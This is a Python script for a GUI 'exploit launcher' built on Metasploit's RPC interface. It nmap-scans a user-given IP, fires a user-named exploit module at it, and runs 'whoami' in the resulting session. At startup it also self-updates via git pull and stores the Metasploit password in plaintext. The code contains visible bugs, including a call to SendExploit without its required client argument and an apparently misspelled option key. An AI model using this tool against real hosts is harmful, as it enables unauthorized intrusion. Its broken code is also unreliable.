try:
    import tkinter as tk
    import time
    import random
    import subprocess
    import datetime
    import nmap3
    import os, sys
    import pymetasploit3
    from pymetasploit3.msfrpc import *
    from progress.bar import Bar
    now = datetime.datetime.now()
    nm = nmap3.Nmap()
except ImportError:
    print("Dependancies unmet..")
    InstallOption = input("would you like to install? (y/n) ->")
    def InstallDepends(InstallOption):
        if InstallOption == "y":
            try:
                print("starting to install requirements, please wait")
                subprocess.call("sudo ./install.sh",shell=True)
            except OSError:
                print("install file not found or could not install.... is 'install.sh' in this directory?")
                exit()
        else:
            print("okay, exiting....")
            exit()
    InstallDepends(InstallOption)

colors = ['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W = '\033[0m'

try:
    bar1 = Bar(random.choice(colors) + "Checking for updates" + W, fill="@",max=20)
    for i in range(20):
        bar1.next()
        time.sleep(0.5)
    subprocess.call("git pull https://github.com/THEpWn3R-o/metasploit-exploit-launcher.git",shell=True)
    bar1.finish()
    print(random.choice(colors) + "If new version was pulled, it is recommended highly to restart the script." + W)
    time.sleep(3)
except KeyboardInterrupt:
    print("exiting, ctrl+c detected...")
    time.sleep(2)
    exit()

if os.path.isfile("MsfDetails.txt"):
    with open("MsfDetails.txt", "r") as f:
        d = f.read().split(",")
        ServerIp = d[0]
        Msfpassword = d[1]
else:
    ServerIp = input("What is the ip you would like to run the sever on? (127.0.0.1 is best) -> ")
    Msfpassword = input("What is the password to your msf server? -> ")
    with open("MsfDetails.txt", "w") as f:
        f.write(f"{ServerIp},{Msfpassword}")

try:
    subprocess.call("clear", shell=True)
    print(random.choice(colors) + "Connecting to MsfRpcClient server...." + W)
    print(random.choice(colors) + "Remember, you must load the sever through msf before using this script.\nwhile in msfconsole type 'load msgrpc pass=****' <- with your pass that is on file." + W)
    client = MsfRpcClient(Msfpassword, ssl=True, port=55552)
except pymetasploit3.msfrpc.MsfAuthError:
    print("Unable to authenticate....")
    exit()

print("""
----------------------
|     Starting       |
|       Gui          |
----------------------""")

print("\nchecking root perms.....")
time.sleep(1)

if not os.geteuid()==0:
    sys.exit('\nRun program as root!')
else:
    print("user is root, continuing...")
try:
    #welcome screen
    StartUpWelcome = tk.Tk()
    StartUpWelcome.title("welcome page")
    StartUpWelcomeText = tk.Label(text=f"Welcome to my python metasploit exploit launcher!\n This tool was created by thepwn3r\n Email: pwn3er889@gmail.com\n Enjoy your stay!\n the time is: {now}")
    SeeTermNotice = tk.Label(text="Please see terminal if this is your first time running this script....")
    CloseButton = tk.Button(text="Press me to close!")
    def CloseButtonHandler(event):
        print("closeing welcome page..\n")
        print("\nopening up launcher window...")
        StartUpWelcome.destroy()
    StartUpWelcomeText.pack()
    CloseButton.pack()
    SeeTermNotice.pack()
    CloseButton.bind("<Button-1>", CloseButtonHandler)
    StartUpWelcome.mainloop()

except KeyboardInterrupt:
    print("ctrl+c detected, exiting...")
    print("cleaning up...")
    time.sleep(1)

try:
    #main screen
    LauncherPage = tk.Tk()
    LauncherPage.title("Exploit Launcher")
    LabelForTargetIp = tk.Label(text="target ip")
    Target_Ip_Entry = tk.Entry()
    def ScanIP(target_ip, port):
        Scan_1 = nm.scan_top_ports(target_ip)
        scan_2 = nm.nmap_os_detection(target_ip)
        print("---------------------------------------------------------------")
        print(f"scanning {target_ip} for ports {port}")
        print("---------------------------------------------------------------")
        result = Scan_1
        result2 = scan_2
        print(f"""

<-------------------------------------------------------------------------------->
        results:
{result}



{result2}
<-------------------------------------------------------------------------------->

""")
    def SendExploit(target_ip, port, exploit_name, client):
        exploit = client.modules.use('exploit', exploit_name)
        exploit['RHOSTS'] = target_ip
        exploit['RPORTS'] = port
        console_id = client.consoles.console().cid
        console = client.consoles.console(console_id)
        console.run_module_with_output(exploit)
        shell = client.sessions.session('1')
        shell.write('whoami')
        shell.read()
    
    def SendExploitButtonHandler(event):
        exploit_name = Exploit_Entry.get()
        target_ip = Target_Ip_Entry.get()
        port = Target_Port_Entry.get()
        CompletionLable = tk.Label(text="Check console for details, Finished...")
        CompletionLable.pack()
        print(f"\n \nip address and port grabbed is {target_ip} & {port}")
        print("information submitted.....\n \n")
        ScanIP(target_ip, port)
        print("event completed....")
        target_os = Target_OS_Entry.get().capitalize()
        SendExploit(target_ip, port, exploit_name)

    Target_Port_Entry = tk.Entry()
    Target_Port_Label = tk.Label(text="Target port/port range")
    Target_OS_Lable = tk.Label(text="Target OS or Server OS \n (if its a websever)")
    Target_OS_Entry = tk.Entry()
    Exploit_Entry = tk.Entry()
    Exploit_Label = tk.Label(text="Type the exploit you want to use")
    Exploit_Submit_Button = tk.Button(text="Send Exploit!")
    exploit_name = Exploit_Entry.get()
    Exploit_Submit_Button.bind('<Button-1>', SendExploitButtonHandler)
    LabelForTargetIp.pack()
    Target_Ip_Entry.pack()
    Target_Port_Label.pack()
    Target_Port_Entry.pack()
    Target_OS_Lable.pack()
    Target_OS_Entry.pack()
    Exploit_Label.pack()
    Exploit_Entry.pack()
    Exploit_Submit_Button.pack()
    LauncherPage.mainloop()
except KeyboardInterrupt:
    print("ctrl+c detected, exiting...")
    print("cleaning up...")
    time.sleep(1)
